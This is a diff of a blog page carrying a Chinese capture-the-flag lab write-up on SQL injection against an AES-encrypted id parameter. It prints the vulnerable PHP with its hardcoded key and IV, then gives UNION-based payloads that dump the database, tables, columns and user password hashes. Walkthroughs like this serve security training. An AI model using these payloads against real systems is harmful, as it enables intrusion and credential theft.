@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya2k0035s04z3sdybuhx" class="article article-type-post" itemscope
+    <article id="post-ckwrjlygz003cys4za27nehdg" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -182,7 +182,41 @@
 
 
 <p> <strong>1. 靶场截图：</strong><img src="https://img-blog.csdnimg.cn/20190810122825737.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>2. 目录扫描</strong><br> <img src="https://img-blog.csdnimg.cn/2019081012305213.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">访问可得new目录下list.php源码，即在此处存在注入漏洞<br> <strong>3. 代码审计</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;); //发起原始的http报头</span><br><span class="line">require_once &#x27;../config.php&#x27;;  //加载config.php的代码（个人理解为数据库查询代码）</span><br><span class="line">//解密过程</span><br><span class="line">function decode($data)&#123;</span><br><span class="line">	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&#x27;&#x27;,MCRYPT_MODE_CBC,&#x27;&#x27;); //打开加密算法和模块（算法名称、加密模块位置、加密模式CBC、加密模式的路径）</span><br><span class="line">                                                   					        //mcrypt_module_open打开成功返回家密描述符     $td = 加密描述符</span><br><span class="line">	mcrypt_generic_init($td,&#x27;ydhaqPQnexoaDuW3&#x27;,&#x27;2018201920202021&#x27;); //初始加密（加密描述符，加密密码，偏移量）</span><br><span class="line">	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));//解密数据    data密文</span><br><span class="line">	mcrypt_generic_deinit($td);//结束加密，执行清理工作</span><br><span class="line">	mcrypt_module_close($td);//关闭加密模块</span><br><span class="line">	if(substr(trim($data),-6)!==&#x27;_mozhe&#x27;)&#123;                                  //判断后6个字符是否等于_mozhe</span><br><span class="line">		echo &#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;;  //不等于重定向页面</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return substr(trim($data),0,strlen(trim($data))-6);       //等于则回显数据</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=decode($_GET[&#x27;id&#x27;]);          //$_GET[]传递参数id</span><br><span class="line">$sql=&quot;select id,title,content,time from notice where id=$id&quot;;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;X公司HR系统V1.0&lt;/title&gt;</span><br><span class="line">&lt;style&gt;.body&#123;width:600px;height:500px;margin:0 auto&#125;.title&#123;color:red;height:60px;line-height:60px;font-size:30px;font-weight:700;margin-top:75pt;border-bottom:2px solid red;text-align:center&#125;.content,.title&#123;margin:0 auto;width:600px;display:block&#125;.content&#123;height:30px;line-height:30px;font-size:18px;margin-top:40px;text-align:left;color:#828282&#125;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;body&quot;&gt;</span><br><span class="line">&lt;div class=&quot;title&quot;&gt;&lt;?php echo $arr[&#x27;title&#x27;]?&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;content&quot;&gt;&lt;?php echo $arr[&#x27;content&#x27;]?&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">&lt;?php
+header(&#x27;content-type:text/html;charset=utf-8&#x27;); //发起原始的http报头
+require_once &#x27;../config.php&#x27;;  //加载config.php的代码（个人理解为数据库查询代码）
+//解密过程
+function decode($data)&#123;
+	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&#x27;&#x27;,MCRYPT_MODE_CBC,&#x27;&#x27;); //打开加密算法和模块（算法名称、加密模块位置、加密模式CBC、加密模式的路径）
+                                                   					        //mcrypt_module_open打开成功返回家密描述符     $td = 加密描述符
+	mcrypt_generic_init($td,&#x27;ydhaqPQnexoaDuW3&#x27;,&#x27;2018201920202021&#x27;); //初始加密（加密描述符，加密密码，偏移量）
+	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));//解密数据    data密文
+	mcrypt_generic_deinit($td);//结束加密，执行清理工作
+	mcrypt_module_close($td);//关闭加密模块
+	if(substr(trim($data),-6)!==&#x27;_mozhe&#x27;)&#123;                                  //判断后6个字符是否等于_mozhe
+		echo &#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;;  //不等于重定向页面
+	&#125;else&#123;
+		return substr(trim($data),0,strlen(trim($data))-6);       //等于则回显数据
+	&#125;
+&#125;
+$id=decode($_GET[&#x27;id&#x27;]);          //$_GET[]传递参数id
+$sql=&quot;select id,title,content,time from notice where id=$id&quot;;
+$info=$link-&gt;query($sql);
+$arr=$info-&gt;fetch_assoc();
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;title&gt;X公司HR系统V1.0&lt;/title&gt;
+&lt;style&gt;.body&#123;width:600px;height:500px;margin:0 auto&#125;.title&#123;color:red;height:60px;line-height:60px;font-size:30px;font-weight:700;margin-top:75pt;border-bottom:2px solid red;text-align:center&#125;.content,.title&#123;margin:0 auto;width:600px;display:block&#125;.content&#123;height:30px;line-height:30px;font-size:18px;margin-top:40px;text-align:left;color:#828282&#125;&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;body&quot;&gt;
+&lt;div class=&quot;title&quot;&gt;&lt;?php echo $arr[&#x27;title&#x27;]?&gt;&lt;/div&gt;
+&lt;div class=&quot;content&quot;&gt;&lt;?php echo $arr[&#x27;content&#x27;]?&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
 <p><strong>即是先对通过?id=注入的数据解密得到明文进行判断是否后六个字符为_mozhe,只需反向加密构造payload即可</strong></p>
 <p> <strong>4. 构造payload</strong><br>        先对?id=之后的数据进行AES加密，加密模式CBC，加密位数128位，加密密码ydhaqPQnexoaDuW3，加密偏移量2018201920202021，然后又进行两次base64加密。<strong>填充为zeropadding。</strong><br><br>        <font color=#ff6600><strong>注意：</strong></font>AES加密后默认的输出结果是base64编码格式的，所以后续只需进行一次base64加密即可。<br>        <img src="https://img-blog.csdnimg.cn/20210511113422449.png" alt="在这里插入图片描述"></p>
 <p><br><strong>构造payload：-1 union select 1,2,3,4_mozhe</strong><br>        AES加密：xgd58ipTrnx8VzS*JicqCo3+zFFzhay5byFU3cjbdeI=<br>        base64加密：eGdkNThpcFRybng4VnpTQkppY3FDbzMrekZGemhheTVieUZVM2NqYmRlST0=<br>        获取显示位：<br>        <img src="https://img-blog.csdnimg.cn/20190810131021173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        <strong>5.爆库爆表爆列爆字段</strong><br>       爆库： -1 union select 1,database(),3,4_mozhe<br>       爆表：-1 union select 1,group_concat(table_name),3,4 frominformation_schema.TABLES where TABLE_SCHEMA=’mozhe_Discuz_StormGroup’ limit0,1_mozhe<br>       爆列：-1 union select 1,group_concat(column_name),3,4 frominformation_schema.columns where table_name=’StormGroup_member’ limit 0,1_mozhe<br>       爆字段：-1 union select 1,group_concat(name,password),3,4 fromStormGroup_member limit 0,1_mozhe<br>       <strong>6.得到key</strong><br>       注意MD5解密下，主要是信息泄露的代码搞懂就可以，加解密还是要了解下。</p>
